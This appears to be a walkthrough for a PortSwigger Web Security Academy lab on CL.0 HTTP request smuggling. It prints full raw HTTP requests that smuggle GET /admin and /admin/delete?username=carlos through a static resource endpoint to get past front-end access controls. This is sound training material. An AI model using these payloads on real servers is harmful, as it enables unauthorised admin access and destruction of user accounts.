## CL.0 request smuggling

This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more 
details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.

## Notes

- Admin Panel on /admin
- Admin Panel on /admin-panel
- Admin Panel on /admin_panel
- Admin Panel on /admin_controls
- Admin Panel on /admin-controls
- Possibility to leave a comment on a post
- /login
- reflected word in 404 response

## Resume

1. Probe endpoints for CL.0 behavior
2. Identify a vulnerable static resource endpoint
3. Smuggle a request to `/admin`
4. Confirm front-end restrictions are bypassed
5. Smuggle a request to `/admin/delete?username=carlos`

## Solve

Create two requests in a Repeater group and send them using **Send group in sequence (single connection)**.

Use the first request to test whether an endpoint ignores the `Content-Length` header.

Example probe:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: 0ae8003e030ac0498174b2d40072005a.web-security-academy.net
Cookie: session=G19fnoe4lnVupO6lFdsR9aqUf39QlFTI
Connection: keep-alive
Content-Length: 31

GET /hopefully404 HTTP/1.1
Foo: x
```

If the second request in the sequence receives the expected `404` response, this confirms that the back-end ignored the `Content-Length` value and interpreted the smuggled request separately.

This demonstrates a **CL.0 desync** vulnerability on the `/resources/images/blog.svg` endpoint.

Access the admin panel by replacing the smuggled request:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: 0ae8003e030ac0498174b2d40072005a.web-security-academy.net
Cookie: session=G19fnoe4lnVupO6lFdsR9aqUf39QlFTI
Connection: keep-alive
Content-Length: 25

GET /admin HTTP/1.1
Foo: x
```

When the request sequence is sent, the second response contains the admin panel, confirming that the front-end access controls have been bypassed.

Delete the user `carlos` with the final smuggled request:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: 0ae8003e030ac0498174b2d40072005a.web-security-academy.net
Cookie: session=G19fnoe4lnVupO6lFdsR9aqUf39QlFTI
Connection: keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

Alternatively, the equivalent payload can be sent using HTTP/2:

```http
POST /resources/images/blog.svg HTTP/2
Host: 0ae8003e030ac0498174b2d40072005a.web-security-academy.net
Cookie: session=G19fnoe4lnVupO6lFdsR9aqUf39QlFTI
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

Once the smuggled request is processed by the back-end, the user `carlos` is deleted and the lab is solved.
